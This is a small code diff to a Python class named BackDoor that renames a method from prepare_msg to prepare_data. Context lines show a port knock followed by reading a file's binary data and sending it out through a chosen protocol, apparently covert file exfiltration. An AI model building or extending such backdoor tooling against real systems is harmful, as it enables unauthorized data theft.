@@ -231,9 +231,9 @@ class BackDoor:
         self.port_knock()
         # Give time for client to open ports
         time.sleep(2)
-        self.prepare_msg()
+        self.prepare_data()
 
-    def prepare_msg(self) -> None:
+    def prepare_data(self) -> None:
         """Gets file data and sends through specified protocol"""
         print(f"sending {self.path}")
         binary_data = self.get_bin()
